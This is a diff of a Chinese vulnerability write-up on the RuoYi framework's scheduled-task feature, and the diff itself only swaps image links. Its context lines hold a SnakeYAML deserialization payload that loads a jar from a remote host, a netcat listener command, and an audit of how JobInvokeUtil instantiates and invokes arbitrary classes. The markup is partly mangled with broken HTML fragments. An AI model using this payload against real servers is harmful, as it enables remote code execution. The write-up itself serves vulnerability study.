@@ -107,7 +107,7 @@ nc -lvnp 1234
 org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://192.168.3.3:2333/yaml-payload.jar"]]]]')
 ```
 
-[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639821570625-64c6f18b-a6c6-4862-963a-686a2ea26e3b.png#clientId=ue68eae55-4845-4&from=paste&height=445&id=u829c11d6&margin=%5Bobject%20Object%5D&></a></p><p></p><h4 id=)代码审计过程：](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818556435-8bc93217-25fe-4f47-a311-9c2bb65e1f7a.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u162379a0&margin=%5Bobject%20Object%5D&><img class=)
+[![](../../.resource/remote/92d78b4f7056a9bded352208da919e4bc6ad66f780817f03fd1237d0d783fc8f.png)代码审计过程：](../../.resource/remote/ae0f09bb11708bc25ec8984fc88867502e4fd0ceb5c902791df29d37c3d377d4.png)
 
 [1、当我们添加并执行计划任务时，若依 (ruoyi) 会调用 com.ruoyi.quartz.util#JobInvokeUtil 解析并执行我们传入的数据  
 这里的代码逻辑：  
@@ -116,7 +116,7 @@ methodName 获取传入的方法名；
 methodParams 获取传入方法的参数，如果参数异常会报错导致无法执行下一步；  
 �  
 接着判断传入的类名是否有效 (判断逻辑：是否含有小数点)，有效的话就会调用 Class.forName(beanName).newInstance(); 进行实例化，然后运行 invokeMethod(bean, methodName, methodParams); 执行该类对应的方法  
-](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818556435-8bc93217-25fe-4f47-a311-9c2bb65e1f7a.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u162379a0&margin=%5Bobject%20Object%5D&><img class=)[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639817050808-aefb6702-b5f1-4560-8688-08a53d7649be.png#clientId=ue68eae55-4845-4&from=paste&height=468&id=u47df42a0&margin=%5Bobject%20Object%5D&></a><br>
+](../../.resource/remote/ae0f09bb11708bc25ec8984fc88867502e4fd0ceb5c902791df29d37c3d377d4.png)[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639817050808-aefb6702-b5f1-4560-8688-08a53d7649be.png#clientId=ue68eae55-4845-4&from=paste&height=468&id=u47df42a0&margin=%5Bobject%20Object%5D&></a><br>
 2、可能直接贴代码大家不知道数据是怎么传输的，现在我传入一串如下数据，然后调试一下大家就明白了 (这里有个坑，传入的字符串必须用单引号包含，不然会出现问题，尤其是 EXP 的时候，刚开始复现漏洞就因为这里弄了好久还以为是玄学，感兴趣的可以看看 com.ruoyi.quartz.util#getMethodParams)</p><p></p><pre class=)java.lang.xxx.func('aaa')](https://cdn.nlark.com/yuque/0/2021/png/357973/1639815639321-e85ac05f-29b0-4162-b97b-5dc3e685c140.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=ua937f630&margin=%5Bobject%20Object%5D&><img class=)
 
 [![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639820133920-be3c938f-d43b-4b4e-9027-b18c8f60a1f2.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u4503339b&margin=%5Bobject%20Object%5D&></a><br>
